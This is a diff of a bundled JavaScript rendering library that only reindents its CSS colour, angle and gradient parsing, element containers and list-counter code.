-        		case GRAD:
-        			return (Math.PI / 200) * value.number;
-        		case RAD:
-        			return value.number;
-        		case TURN:
-        			return Math.PI * 2 * value.number;
-        		}
-        	}
-        	throw new Error("Unsupported angle type");
-        }
-    };
-    var isAngle = function (value) {
+              		switch (value.unit) {
+              		case DEG:
+              			return (Math.PI * value.number) / 180;
+              		case GRAD:
+              			return (Math.PI / 200) * value.number;
+              		case RAD:
+              			return value.number;
+              		case TURN:
+              			return Math.PI * 2 * value.number;
+              		}
+              	}
+              	throw new Error("Unsupported angle type");
+              }
+            };
+            var isAngle = function (value) {
         if (value.type === 15 /* DIMENSION_TOKEN */) {
-    	if (value.unit === DEG || value.unit === GRAD || value.unit === RAD || value.unit === TURN) {
-    		return true;
-    	}
-    }
-    return false;
-};
-var parseNamedSide = function (tokens) {
-	var sideOrCorner = tokens
-	.filter(isIdentToken)
-	.map(function (ident) { return ident.value; })
-	.join(' ');
-	switch (sideOrCorner) {
-	case 'to bottom right':
-	case 'to right bottom':
-	case 'left top':
-	case 'top left':
-		return [ZERO_LENGTH, ZERO_LENGTH];
-	case 'to top':
-	case 'bottom':
-		return deg(0);
-	case 'to bottom left':
-	case 'to left bottom':
-	case 'right top':
-	case 'top right':
-		return [ZERO_LENGTH, HUNDRED_PERCENT];
-	case 'to right':
-	case 'left':
-		return deg(90);
-	case 'to top left':
-	case 'to left top':
-	case 'right bottom':
-	case 'bottom right':
-		return [HUNDRED_PERCENT, HUNDRED_PERCENT];
-	case 'to bottom':
-	case 'top':
-		return deg(180);
-	case 'to top right':
-	case 'to right top':
-	case 'left bottom':
-	case 'bottom left':
-		return [HUNDRED_PERCENT, ZERO_LENGTH];
-	case 'to left':
-	case 'right':
-		return deg(270);
-	}
-	return 0;
-};
-var deg = function (deg) { return (Math.PI * deg) / 180; };
+            	if (value.unit === DEG || value.unit === GRAD || value.unit === RAD || value.unit === TURN) {
+            		return true;
+            	}
+            }
+            return false;
+          };
+          var parseNamedSide = function (tokens) {
+          	var sideOrCorner = tokens
+          	.filter(isIdentToken)
+          	.map(function (ident) { return ident.value; })
+          	.join(' ');
+          	switch (sideOrCorner) {
+          	case 'to bottom right':
+          	case 'to right bottom':
+          	case 'left top':
+          	case 'top left':
+          		return [ZERO_LENGTH, ZERO_LENGTH];
+          	case 'to top':
+          	case 'bottom':
+          		return deg(0);
+          	case 'to bottom left':
+          	case 'to left bottom':
+          	case 'right top':
+          	case 'top right':
+          		return [ZERO_LENGTH, HUNDRED_PERCENT];
+          	case 'to right':
+          	case 'left':
+          		return deg(90);
+          	case 'to top left':
+          	case 'to left top':
+          	case 'right bottom':
+          	case 'bottom right':
+          		return [HUNDRED_PERCENT, HUNDRED_PERCENT];
+          	case 'to bottom':
+          	case 'top':
+          		return deg(180);
+          	case 'to top right':
+          	case 'to right top':
+          	case 'left bottom':
+          	case 'bottom left':
+          		return [HUNDRED_PERCENT, ZERO_LENGTH];
+          	case 'to left':
+          	case 'right':
+          		return deg(270);
+          	}
+          	return 0;
+          };
+          var deg = function (deg) { return (Math.PI * deg) / 180; };
 
-var color$1 = {
-	name: 'color',
-	parse: function (context, value) {
+          var color$1 = {
+          	name: 'color',
+          	parse: function (context, value) {
             if (value.type === 18 /* FUNCTION */) {
-		var colorFunction = SUPPORTED_COLOR_FUNCTIONS[value.name];
-		if (typeof colorFunction === 'undefined') {
-			throw new Error("Attempting to parse an unsupported color function \"" + value.name + "\"");
-		}
-		return colorFunction(context, value.values);
-	}
+          		var colorFunction = SUPPORTED_COLOR_FUNCTIONS[value.name];
+          		if (typeof colorFunction === 'undefined') {
+          			throw new Error("Attempting to parse an unsupported color function \"" + value.name + "\"");
+          		}
+          		return colorFunction(context, value.values);
+          	}
             if (value.type === 5 /* HASH_TOKEN */) {
-	if (value.value.length === 3) {
-		var r = value.value.substring(0, 1);
-		var g = value.value.substring(1, 2);
-		var b = value.value.substring(2, 3);
-		return pack(parseInt(r + r, 16), parseInt(g + g, 16), parseInt(b + b, 16), 1);
-	}
-	if (value.value.length === 4) {
-		var r = value.value.substring(0, 1);
-		var g = value.value.substring(1, 2);
-		var b = value.value.substring(2, 3);
-		var a = value.value.substring(3, 4);
-		return pack(parseInt(r + r, 16), parseInt(g + g, 16), parseInt(b + b, 16), parseInt(a + a, 16) / 255);
-	}
-	if (value.value.length === 6) {
-		var r = value.value.substring(0, 2);
-		var g = value.value.substring(2, 4);
-		var b = value.value.substring(4, 6);
-		return pack(parseInt(r, 16), parseInt(g, 16), parseInt(b, 16), 1);
-	}
-	if (value.value.length === 8) {
-		var r = value.value.substring(0, 2);
-		var g = value.value.substring(2, 4);
-		var b = value.value.substring(4, 6);
-		var a = value.value.substring(6, 8);
-		return pack(parseInt(r, 16), parseInt(g, 16), parseInt(b, 16), parseInt(a, 16) / 255);
-	}
-}
+          	if (value.value.length === 3) {
+          		var r = value.value.substring(0, 1);
+          		var g = value.value.substring(1, 2);
+          		var b = value.value.substring(2, 3);
+          		return pack(parseInt(r + r, 16), parseInt(g + g, 16), parseInt(b + b, 16), 1);
+          	}
+          	if (value.value.length === 4) {
+          		var r = value.value.substring(0, 1);
+          		var g = value.value.substring(1, 2);
+          		var b = value.value.substring(2, 3);
+          		var a = value.value.substring(3, 4);
+          		return pack(parseInt(r + r, 16), parseInt(g + g, 16), parseInt(b + b, 16), parseInt(a + a, 16) / 255);
+          	}
+          	if (value.value.length === 6) {
+          		var r = value.value.substring(0, 2);
+          		var g = value.value.substring(2, 4);
+          		var b = value.value.substring(4, 6);
+          		return pack(parseInt(r, 16), parseInt(g, 16), parseInt(b, 16), 1);
+          	}
+          	if (value.value.length === 8) {
+          		var r = value.value.substring(0, 2);
+          		var g = value.value.substring(2, 4);
+          		var b = value.value.substring(4, 6);
+          		var a = value.value.substring(6, 8);
+          		return pack(parseInt(r, 16), parseInt(g, 16), parseInt(b, 16), parseInt(a, 16) / 255);
+          	}
+          }
             if (value.type === 20 /* IDENT_TOKEN */) {
-var namedColor = COLORS[value.value.toUpperCase()];
-if (typeof namedColor !== 'undefined') {
-	return namedColor;
-}
-}
-return COLORS.TRANSPARENT;
-}
-};
-var isTransparent = function (color) { return (0xff & color) === 0; };
-var asString = function (color) {
-	var alpha = 0xff & color;
-	var blue = 0xff & (color >> 8);
-	var green = 0xff & (color >> 16);
-	var red = 0xff & (color >> 24);
-	return alpha < 255 ? "rgba(" + red + "," + green + "," + blue + "," + alpha / 255 + ")" : "rgb(" + red + "," + green + "," + blue + ")";
-};
-var pack = function (r, g, b, a) {
-	return ((r << 24) | (g << 16) | (b << 8) | (Math.round(a * 255) << 0)) >>> 0;
-};
-var getTokenColorValue = function (token, i) {
+          var namedColor = COLORS[value.value.toUpperCase()];
+          if (typeof namedColor !== 'undefined') {
+          	return namedColor;
+          }
+        }
+        return COLORS.TRANSPARENT;
+      }
+    };
+    var isTransparent = function (color) { return (0xff & color) === 0; };
+    var asString = function (color) {
+    	var alpha = 0xff & color;
+    	var blue = 0xff & (color >> 8);
+    	var green = 0xff & (color >> 16);
+    	var red = 0xff & (color >> 24);
+    	return alpha < 255 ? "rgba(" + red + "," + green + "," + blue + "," + alpha / 255 + ")" : "rgb(" + red + "," + green + "," + blue + ")";
+    };
+    var pack = function (r, g, b, a) {
+    	return ((r << 24) | (g << 16) | (b << 8) | (Math.round(a * 255) << 0)) >>> 0;
+    };
+    var getTokenColorValue = function (token, i) {
         if (token.type === 17 /* NUMBER_TOKEN */) {
-	return token.number;
-}
+    	return token.number;
+    }
         if (token.type === 16 /* PERCENTAGE_TOKEN */) {
-var max = i === 3 ? 1 : 255;
-return i === 3 ? (token.number / 100) * max : Math.round((token.number / 100) * max);
-}
-return 0;
+    var max = i === 3 ? 1 : 255;
+    return i === 3 ? (token.number / 100) * max : Math.round((token.number / 100) * max);
+  }
+  return 0;
 };
 var rgb = function (_context, args) {
 	var tokens = args.filter(nonFunctionArgSeparator);
@@ -3546,7 +4028,7 @@ var findCorner = function (width, height, x, y, closest) {
 		[0, height],
 		[width, 0],
 		[width, height]
-		];
+	];
 	return corners.reduce(function (stat, corner) {
 		var cx = corner[0], cy = corner[1];
 		var d = distance(x - cx, y - cy);
@@ -3654,15 +4136,15 @@ var prefixLinearGradient = function (context, tokens) {
 			['top', 'left', 'right', 'bottom'].indexOf(firstToken.value) !== -1) {
                 	angle$1 = parseNamedSide(arg);
                 return;
+              }
+              else if (isAngle(firstToken)) {
+              	angle$1 = (angle.parse(context, firstToken) + deg(270)) % deg(360);
+              	return;
+              }
             }
-            else if (isAngle(firstToken)) {
-            	angle$1 = (angle.parse(context, firstToken) + deg(270)) % deg(360);
-            	return;
-            }
-        }
-        var colorStop = parseColorStop(context, arg);
-        stops.push(colorStop);
-    });
+            var colorStop = parseColorStop(context, arg);
+            stops.push(colorStop);
+          });
 	return {
 		angle: angle$1,
 		stops: stops,
@@ -5169,7 +5651,7 @@ return CSSParsedPseudoDeclaration;
     	this.counterReset = parse(context, counterReset, declaration.counterReset);
     }
     return CSSParsedCounterDeclaration;
-}());
+  }());
     // eslint-disable-next-line @typescript-eslint/no-explicit-any
     var parse = function (context, descriptor, style) {
     	var tokenizer = new Tokenizer();
@@ -5250,7 +5732,7 @@ return CSSParsedPseudoDeclaration;
     this.bounds = parseBounds(this.context, element);
             if (isDebugging(element, 4 /* RENDER */)) {
                 this.flags |= 16 /* DEBUG_RENDER */;
-}
+  }
 }
 return ElementContainer;
 }());
@@ -5450,7 +5932,7 @@ return ElementContainer;
     	return this.errorValue;
     };
     return Trie;
-}());
+  }());
 
     /*
      * base64-arraybuffer 1.0.2 <https://github.com/niklasvh/base64-arraybuffer>
@@ -5949,7 +6431,7 @@ return ElementContainer;
     	this.textBounds = parseTextBounds(context, this.text, styles, node);
     }
     return TextContainer;
-}());
+  }());
     var transform = function (text, transform) {
     	switch (transform) {
             case 1 /* LOWERCASE */:
@@ -5981,7 +6463,7 @@ return ElementContainer;
     	return _this;
     }
     return ImageElementContainer;
-}(ElementContainer));
+  }(ElementContainer));
 
     var CanvasElementContainer = /** @class */ (function (_super) {
     __extends(CanvasElementContainer, _super);
@@ -5993,7 +6475,7 @@ return ElementContainer;
     	return _this;
     }
     return CanvasElementContainer;
-}(ElementContainer));
+  }(ElementContainer));
 
     var SVGElementContainer = /** @class */ (function (_super) {
     __extends(SVGElementContainer, _super);
@@ -6010,7 +6492,7 @@ return ElementContainer;
     	return _this;
     }
     return SVGElementContainer;
-}(ElementContainer));
+  }(ElementContainer));
 
     var LIElementContainer = /** @class */ (function (_super) {
     __extends(LIElementContainer, _super);
@@ -6020,7 +6502,7 @@ return ElementContainer;
     	return _this;
     }
     return LIElementContainer;
-}(ElementContainer));
+  }(ElementContainer));
 
     var OLElementContainer = /** @class */ (function (_super) {
     __extends(OLElementContainer, _super);
@@ -6031,22 +6513,22 @@ return ElementContainer;
     	return _this;
     }
     return OLElementContainer;
-}(ElementContainer));
+  }(ElementContainer));
 
     var CHECKBOX_BORDER_RADIUS = [
-    {
+    	{
             type: 15 /* DIMENSION_TOKEN */,
-    	flags: 0,
-    	unit: 'px',
-    	number: 3
-    }
+    		flags: 0,
+    		unit: 'px',
+    		number: 3
+    	}
     ];
     var RADIO_BORDER_RADIUS = [
-    {
+    	{
             type: 16 /* PERCENTAGE_TOKEN */,
-    	flags: 0,
-    	number: 50
-    }
+    		flags: 0,
+    		number: 50
+    	}
     ];
     var reformatInputBounds = function (bounds) {
     	if (bounds.width > bounds.height) {
@@ -6112,7 +6594,7 @@ return ElementContainer;
     	return _this;
     }
     return InputElementContainer;
-}(ElementContainer));
+  }(ElementContainer));
 
     var SelectElementContainer = /** @class */ (function (_super) {
     __extends(SelectElementContainer, _super);
@@ -6123,7 +6605,7 @@ return ElementContainer;
     	return _this;
     }
     return SelectElementContainer;
-}(ElementContainer));
+  }(ElementContainer));
 
     var TextareaElementContainer = /** @class */ (function (_super) {
     __extends(TextareaElementContainer, _super);
@@ -6133,7 +6615,7 @@ return ElementContainer;
     	return _this;
     }
     return TextareaElementContainer;
-}(ElementContainer));
+  }(ElementContainer));
 
     var IFrameElementContainer = /** @class */ (function (_super) {
     __extends(IFrameElementContainer, _super);
@@ -6164,8 +6646,8 @@ return ElementContainer;
     }
     catch (e) { }
     return _this;
-}
-return IFrameElementContainer;
+  }
+  return IFrameElementContainer;
 }(ElementContainer));
 
     var LIST_OWNERS = ['OL', 'UL', 'MENU'];
@@ -6205,126 +6687,126 @@ return IFrameElementContainer;
     		}
     	}
     }
-};
-var createContainer = function (context, element) {
-	if (isImageElement(element)) {
-		return new ImageElementContainer(context, element);
-	}
-	if (isCanvasElement(element)) {
-		return new CanvasElementContainer(context, element);
-	}
-	if (isSVGElement(element)) {
-		return new SVGElementContainer(context, element);
-	}
-	if (isLIElement(element)) {
-		return new LIElementContainer(context, element);
-	}
-	if (isOLElement(element)) {
-		return new OLElementContainer(context, element);
-	}
-	if (isInputElement(element)) {
-		return new InputElementContainer(context, element);
-	}
-	if (isSelectElement(element)) {
-		return new SelectElementContainer(context, element);
-	}
-	if (isTextareaElement(element)) {
-		return new TextareaElementContainer(context, element);
-	}
-	if (isIFrameElement(element)) {
-		return new IFrameElementContainer(context, element);
-	}
-	return new ElementContainer(context, element);
-};
-var parseTree = function (context, element) {
-	var container = createContainer(context, element);
+  };
+  var createContainer = function (context, element) {
+  	if (isImageElement(element)) {
+  		return new ImageElementContainer(context, element);
+  	}
+  	if (isCanvasElement(element)) {
+  		return new CanvasElementContainer(context, element);
+  	}
+  	if (isSVGElement(element)) {
+  		return new SVGElementContainer(context, element);
+  	}
+  	if (isLIElement(element)) {
+  		return new LIElementContainer(context, element);
+  	}
+  	if (isOLElement(element)) {
+  		return new OLElementContainer(context, element);
+  	}
+  	if (isInputElement(element)) {
+  		return new InputElementContainer(context, element);
+  	}
+  	if (isSelectElement(element)) {
+  		return new SelectElementContainer(context, element);
+  	}
+  	if (isTextareaElement(element)) {
+  		return new TextareaElementContainer(context, element);
+  	}
+  	if (isIFrameElement(element)) {
+  		return new IFrameElementContainer(context, element);
+  	}
+  	return new ElementContainer(context, element);
+  };
+  var parseTree = function (context, element) {
+  	var container = createContainer(context, element);
         container.flags |= 4 /* CREATES_REAL_STACKING_CONTEXT */;
-	parseNodeTree(context, element, container, container);
-	return container;
-};
-var createsRealStackingContext = function (node, container, root) {
-	return (container.styles.isPositionedWithZIndex() ||
-		container.styles.opacity < 1 ||
-		container.styles.isTransformed() ||
-		(isBodyElement(node) && root.styles.isTransparent()));
-};
-var createsStackingContext = function (styles) { return styles.isPositioned() || styles.isFloating(); };
-var isTextNode = function (node) { return node.nodeType === Node.TEXT_NODE; };
-var isElementNode = function (node) { return node.nodeType === Node.ELEMENT_NODE; };
-var isHTMLElementNode = function (node) {
-	return isElementNode(node) && typeof node.style !== 'undefined' && !isSVGElementNode(node);
-};
-var isSVGElementNode = function (element) {
-	return typeof element.className === 'object';
-};
-var isLIElement = function (node) { return node.tagName === 'LI'; };
-var isOLElement = function (node) { return node.tagName === 'OL'; };
-var isInputElement = function (node) { return node.tagName === 'INPUT'; };
-var isHTMLElement = function (node) { return node.tagName === 'HTML'; };
-var isSVGElement = function (node) { return node.tagName === 'svg'; };
-var isBodyElement = function (node) { return node.tagName === 'BODY'; };
-var isCanvasElement = function (node) { return node.tagName === 'CANVAS'; };
-var isVideoElement = function (node) { return node.tagName === 'VIDEO'; };
-var isImageElement = function (node) { return node.tagName === 'IMG'; };
-var isIFrameElement = function (node) { return node.tagName === 'IFRAME'; };
-var isStyleElement = function (node) { return node.tagName === 'STYLE'; };
-var isScriptElement = function (node) { return node.tagName === 'SCRIPT'; };
-var isTextareaElement = function (node) { return node.tagName === 'TEXTAREA'; };
-var isSelectElement = function (node) { return node.tagName === 'SELECT'; };
-var isSlotElement = function (node) { return node.tagName === 'SLOT'; };
+  	parseNodeTree(context, element, container, container);
+  	return container;
+  };
+  var createsRealStackingContext = function (node, container, root) {
+  	return (container.styles.isPositionedWithZIndex() ||
+  		container.styles.opacity < 1 ||
+  		container.styles.isTransformed() ||
+  		(isBodyElement(node) && root.styles.isTransparent()));
+  };
+  var createsStackingContext = function (styles) { return styles.isPositioned() || styles.isFloating(); };
+  var isTextNode = function (node) { return node.nodeType === Node.TEXT_NODE; };
+  var isElementNode = function (node) { return node.nodeType === Node.ELEMENT_NODE; };
+  var isHTMLElementNode = function (node) {
+  	return isElementNode(node) && typeof node.style !== 'undefined' && !isSVGElementNode(node);
+  };
+  var isSVGElementNode = function (element) {
+  	return typeof element.className === 'object';
+  };
+  var isLIElement = function (node) { return node.tagName === 'LI'; };
+  var isOLElement = function (node) { return node.tagName === 'OL'; };
+  var isInputElement = function (node) { return node.tagName === 'INPUT'; };
+  var isHTMLElement = function (node) { return node.tagName === 'HTML'; };
+  var isSVGElement = function (node) { return node.tagName === 'svg'; };
+  var isBodyElement = function (node) { return node.tagName === 'BODY'; };
+  var isCanvasElement = function (node) { return node.tagName === 'CANVAS'; };
+  var isVideoElement = function (node) { return node.tagName === 'VIDEO'; };
+  var isImageElement = function (node) { return node.tagName === 'IMG'; };
+  var isIFrameElement = function (node) { return node.tagName === 'IFRAME'; };
+  var isStyleElement = function (node) { return node.tagName === 'STYLE'; };
+  var isScriptElement = function (node) { return node.tagName === 'SCRIPT'; };
+  var isTextareaElement = function (node) { return node.tagName === 'TEXTAREA'; };
+  var isSelectElement = function (node) { return node.tagName === 'SELECT'; };
+  var isSlotElement = function (node) { return node.tagName === 'SLOT'; };
     // https://html.spec.whatwg.org/multipage/custom-elements.html#valid-custom-element-name
-var isCustomElement = function (node) { return node.tagName.indexOf('-') > 0; };
+  var isCustomElement = function (node) { return node.tagName.indexOf('-') > 0; };
 
     var CounterState = /** @class */ (function () {
-function CounterState() {
-	this.counters = {};
-}
-CounterState.prototype.getCounterValue = function (name) {
-	var counter = this.counters[name];
-	if (counter && counter.length) {
-		return counter[counter.length - 1];
-	}
-	return 1;
-};
-CounterState.prototype.getCounterValues = function (name) {
-	var counter = this.counters[name];
-	return counter ? counter : [];
-};
-CounterState.prototype.pop = function (counters) {
-	var _this = this;
-	counters.forEach(function (counter) { return _this.counters[counter].pop(); });
-};
-CounterState.prototype.parse = function (style) {
-	var _this = this;
-	var counterIncrement = style.counterIncrement;
-	var counterReset = style.counterReset;
-	var canReset = true;
-	if (counterIncrement !== null) {
-		counterIncrement.forEach(function (entry) {
-			var counter = _this.counters[entry.counter];
-			if (counter && entry.increment !== 0) {
-				canReset = false;
-				if (!counter.length) {
-					counter.push(1);
-				}
-				counter[Math.max(0, counter.length - 1)] += entry.increment;
-			}
-		});
-	}
-	var counterNames = [];
-	if (canReset) {
-		counterReset.forEach(function (entry) {
-			var counter = _this.counters[entry.counter];
-			counterNames.push(entry.counter);
-			if (!counter) {
-				counter = _this.counters[entry.counter] = [];
-			}
-			counter.push(entry.reset);
-		});
-	}
-	return counterNames;
-};
-return CounterState;
+  function CounterState() {
+  	this.counters = {};
+  }
+  CounterState.prototype.getCounterValue = function (name) {
+  	var counter = this.counters[name];
+  	if (counter && counter.length) {
+  		return counter[counter.length - 1];
+  	}
+  	return 1;
+  };
+  CounterState.prototype.getCounterValues = function (name) {
+  	var counter = this.counters[name];
+  	return counter ? counter : [];
+  };
+  CounterState.prototype.pop = function (counters) {
+  	var _this = this;
+  	counters.forEach(function (counter) { return _this.counters[counter].pop(); });
+  };
+  CounterState.prototype.parse = function (style) {
+  	var _this = this;
+  	var counterIncrement = style.counterIncrement;
+  	var counterReset = style.counterReset;
+  	var canReset = true;
+  	if (counterIncrement !== null) {
+  		counterIncrement.forEach(function (entry) {
+  			var counter = _this.counters[entry.counter];
+  			if (counter && entry.increment !== 0) {
+  				canReset = false;
+  				if (!counter.length) {
+  					counter.push(1);
+  				}
+  				counter[Math.max(0, counter.length - 1)] += entry.increment;
+  			}
+  		});
+  	}
+  	var counterNames = [];
+  	if (canReset) {
+  		counterReset.forEach(function (entry) {
+  			var counter = _this.counters[entry.counter];
+  			counterNames.push(entry.counter);
+  			if (!counter) {
+  				counter = _this.counters[entry.counter] = [];
+  			}
+  			counter.push(entry.reset);
+  		});
+  	}
+  	return counterNames;
+  };
+  return CounterState;
 }());
     var ROMAN_UPPER = {
     	integers: [1000, 900, 500, 400, 100, 90, 50, 40, 10, 9, 5, 4, 1],
@@ -6334,7 +6816,7 @@ return CounterState;
     	integers: [
     		9000, 8000, 7000, 6000, 5000, 4000, 3000, 2000, 1000, 900, 800, 700, 600, 500, 400, 300, 200, 100, 90, 80, 70,
     		60, 50, 40, 30, 20, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1
-    		],
+    	],
     	values: [
     		'Ք',
     		'Փ',
@@ -6372,13 +6854,13 @@ return CounterState;
     		'Գ',
     		'Բ',
     		'Ա'
-    		]
+    	]
     };
     var HEBREW = {
     	integers: [
     		10000, 9000, 8000, 7000, 6000, 5000, 4000, 3000, 2000, 1000, 400, 300, 200, 100, 90, 80, 70, 60, 50, 40, 30, 20,
     		19, 18, 17, 16, 15, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1
-    		],
+    	],
     	values: [
     		'י׳',
     		'ט׳',
@@ -6417,13 +6899,13 @@ return CounterState;
     		'ג',
     		'ב',
     		'א'
-    		]
+    	]
     };
     var GEORGIAN = {
     	integers: [
     		10000, 9000, 8000, 7000, 6000, 5000, 4000, 3000, 2000, 1000, 900, 800, 700, 600, 500, 400, 300, 200, 100, 90,
     		80, 70, 60, 50, 40, 30, 20, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1
-    		],
+    	],
     	values: [
     		'ჵ',
     		'ჰ',
@@ -6462,7 +6944,7 @@ return CounterState;
     		'გ',
     		'ბ',
     		'ა'
-    		]
+    	]
     };
     var createAdditiveCounter = function (value, min, max, symbols, fallback, suffix) {
     	if (value < min || value > max) {
@@ -6531,219 +7013,219 @@ return CounterState;
     	tmp = Math.floor(tmp / 10);
     }
     return (value < 0 ? negativeSign : '') + string;
-};
-var CHINESE_INFORMAL_MULTIPLIERS = '十百千萬';
-var CHINESE_FORMAL_MULTIPLIERS = '拾佰仟萬';
-var JAPANESE_NEGATIVE = 'マイナス';
-var KOREAN_NEGATIVE = '마이너스';
-var createCounterText = function (value, type, appendSuffix) {
-	var defaultSuffix = appendSuffix ? '. ' : '';
-	var cjkSuffix = appendSuffix ? '、' : '';
-	var koreanSuffix = appendSuffix ? ', ' : '';
-	var spaceSuffix = appendSuffix ? ' ' : '';
-	switch (type) {
+  };
+  var CHINESE_INFORMAL_MULTIPLIERS = '十百千萬';
+  var CHINESE_FORMAL_MULTIPLIERS = '拾佰仟萬';
+  var JAPANESE_NEGATIVE = 'マイナス';
+  var KOREAN_NEGATIVE = '마이너스';
+  var createCounterText = function (value, type, appendSuffix) {
+  	var defaultSuffix = appendSuffix ? '. ' : '';
+  	var cjkSuffix = appendSuffix ? '、' : '';
+  	var koreanSuffix = appendSuffix ? ', ' : '';
+  	var spaceSuffix = appendSuffix ? ' ' : '';
+  	switch (type) {
             case 0 /* DISC */:
-		return '•' + spaceSuffix;
+  		return '•' + spaceSuffix;
             case 1 /* CIRCLE */:
-		return '◦' + spaceSuffix;
+  		return '◦' + spaceSuffix;
             case 2 /* SQUARE */:
-		return '◾' + spaceSuffix;
+  		return '◾' + spaceSuffix;
             case 5 /* DECIMAL_LEADING_ZERO */:
-		var string = createCounterStyleFromRange(value, 48, 57, true, defaultSuffix);
-		return string.length < 4 ? "0" + string : string;
+  		var string = createCounterStyleFromRange(value, 48, 57, true, defaultSuffix);
+  		return string.length < 4 ? "0" + string : string;
             case 4 /* CJK_DECIMAL */:
-		return createCounterStyleFromSymbols(value, '〇一二三四五六七八九', cjkSuffix);
+  		return createCounterStyleFromSymbols(value, '〇一二三四五六七八九', cjkSuffix);
             case 6 /* LOWER_ROMAN */:
                 return createAdditiveCounter(value, 1, 3999, ROMAN_UPPER, 3 /* DECIMAL */, defaultSuffix).toLowerCase();
             case 7 /* UPPER_ROMAN */:
                 return createAdditiveCounter(value, 1, 3999, ROMAN_UPPER, 3 /* DECIMAL */, defaultSuffix);
             case 8 /* LOWER_GREEK */:
-		return createCounterStyleFromRange(value, 945, 969, false, defaultSuffix);
+  		return createCounterStyleFromRange(value, 945, 969, false, defaultSuffix);
             case 9 /* LOWER_ALPHA */:
-		return createCounterStyleFromRange(value, 97, 122, false, defaultSuffix);
+  		return createCounterStyleFromRange(value, 97, 122, false, defaultSuffix);
             case 10 /* UPPER_ALPHA */:
-		return createCounterStyleFromRange(value, 65, 90, false, defaultSuffix);
+  		return createCounterStyleFromRange(value, 65, 90, false, defaultSuffix);
             case 11 /* ARABIC_INDIC */:
-		return createCounterStyleFromRange(value, 1632, 1641, true, defaultSuffix);
+  		return createCounterStyleFromRange(value, 1632, 1641, true, defaultSuffix);
             case 12 /* ARMENIAN */:
             case 49 /* UPPER_ARMENIAN */:
                 return createAdditiveCounter(value, 1, 9999, ARMENIAN, 3 /* DECIMAL */, defaultSuffix);
             case 35 /* LOWER_ARMENIAN */:
                 return createAdditiveCounter(value, 1, 9999, ARMENIAN, 3 /* DECIMAL */, defaultSuffix).toLowerCase();
             case 13 /* BENGALI */:
-		return createCounterStyleFromRange(value, 2534, 2543, true, defaultSuffix);
+  		return createCounterStyleFromRange(value, 2534, 2543, true, defaultSuffix);
             case 14 /* CAMBODIAN */:
             case 30 /* KHMER */:
-		return createCounterStyleFromRange(value, 6112, 6121, true, defaultSuffix);
+  		return createCounterStyleFromRange(value, 6112, 6121, true, defaultSuffix);
             case 15 /* CJK_EARTHLY_BRANCH */:
-		return createCounterStyleFromSymbols(value, '子丑寅卯辰巳午未申酉戌亥', cjkSuffix);
+  		return createCounterStyleFromSymbols(value, '子丑寅卯辰巳午未申酉戌亥', cjkSuffix);
             case 16 /* CJK_HEAVENLY_STEM */:
-		return createCounterStyleFromSymbols(value, '甲乙丙丁戊己庚辛壬癸', cjkSuffix);
+  		return createCounterStyleFromSymbols(value, '甲乙丙丁戊己庚辛壬癸', cjkSuffix);
             case 17 /* CJK_IDEOGRAPHIC */:
             case 48 /* TRAD_CHINESE_INFORMAL */:
-		return createCJKCounter(value, '零一二三四五六七八九', CHINESE_INFORMAL_MULTIPLIERS, '負', cjkSuffix, CJK_TEN_COEFFICIENTS | CJK_TEN_HIGH_COEFFICIENTS | CJK_HUNDRED_COEFFICIENTS);
+  		return createCJKCounter(value, '零一二三四五六七八九', CHINESE_INFORMAL_MULTIPLIERS, '負', cjkSuffix, CJK_TEN_COEFFICIENTS | CJK_TEN_HIGH_COEFFICIENTS | CJK_HUNDRED_COEFFICIENTS);
             case 47 /* TRAD_CHINESE_FORMAL */:
-		return createCJKCounter(value, '零壹貳參肆伍陸柒捌玖', CHINESE_FORMAL_MULTIPLIERS, '負', cjkSuffix, CJK_ZEROS | CJK_TEN_COEFFICIENTS | CJK_TEN_HIGH_COEFFICIENTS | CJK_HUNDRED_COEFFICIENTS);
+  		return createCJKCounter(value, '零壹貳參肆伍陸柒捌玖', CHINESE_FORMAL_MULTIPLIERS, '負', cjkSuffix, CJK_ZEROS | CJK_TEN_COEFFICIENTS | CJK_TEN_HIGH_COEFFICIENTS | CJK_HUNDRED_COEFFICIENTS);
             case 42 /* SIMP_CHINESE_INFORMAL */:
-		return createCJKCounter(value, '零一二三四五六七八九', CHINESE_INFORMAL_MULTIPLIERS, '负', cjkSuffix, CJK_TEN_COEFFICIENTS | CJK_TEN_HIGH_COEFFICIENTS | CJK_HUNDRED_COEFFICIENTS);
+  		return createCJKCounter(value, '零一二三四五六七八九', CHINESE_INFORMAL_MULTIPLIERS, '负', cjkSuffix, CJK_TEN_COEFFICIENTS | CJK_TEN_HIGH_COEFFICIENTS | CJK_HUNDRED_COEFFICIENTS);
             case 41 /* SIMP_CHINESE_FORMAL */:
-		return createCJKCounter(value, '零壹贰叁肆伍陆柒捌玖', CHINESE_FORMAL_MULTIPLIERS, '负', cjkSuffix, CJK_ZEROS | CJK_TEN_COEFFICIENTS | CJK_TEN_HIGH_COEFFICIENTS | CJK_HUNDRED_COEFFICIENTS);
+  		return createCJKCounter(value, '零壹贰叁肆伍陆柒捌玖', CHINESE_FORMAL_MULTIPLIERS, '负', cjkSuffix, CJK_ZEROS | CJK_TEN_COEFFICIENTS | CJK_TEN_HIGH_COEFFICIENTS | CJK_HUNDRED_COEFFICIENTS);
             case 26 /* JAPANESE_INFORMAL */:
-		return createCJKCounter(value, '〇一二三四五六七八九', '十百千万', JAPANESE_NEGATIVE, cjkSuffix, 0);
+  		return createCJKCounter(value, '〇一二三四五六七八九', '十百千万', JAPANESE_NEGATIVE, cjkSuffix, 0);
             case 25 /* JAPANESE_FORMAL */:
-		return createCJKCounter(value, '零壱弐参四伍六七八九', '拾百千万', JAPANESE_NEGATIVE, cjkSuffix, CJK_ZEROS | CJK_TEN_COEFFICIENTS | CJK_TEN_HIGH_COEFFICIENTS);
+  		return createCJKCounter(value, '零壱弐参四伍六七八九', '拾百千万', JAPANESE_NEGATIVE, cjkSuffix, CJK_ZEROS | CJK_TEN_COEFFICIENTS | CJK_TEN_HIGH_COEFFICIENTS);
             case 31 /* KOREAN_HANGUL_FORMAL */:
-		return createCJKCounter(value, '영일이삼사오육칠팔구', '십백천만', KOREAN_NEGATIVE, koreanSuffix, CJK_ZEROS | CJK_TEN_COEFFICIENTS | CJK_TEN_HIGH_COEFFICIENTS);
+  		return createCJKCounter(value, '영일이삼사오육칠팔구', '십백천만', KOREAN_NEGATIVE, koreanSuffix, CJK_ZEROS | CJK_TEN_COEFFICIENTS | CJK_TEN_HIGH_COEFFICIENTS);
             case 33 /* KOREAN_HANJA_INFORMAL */:
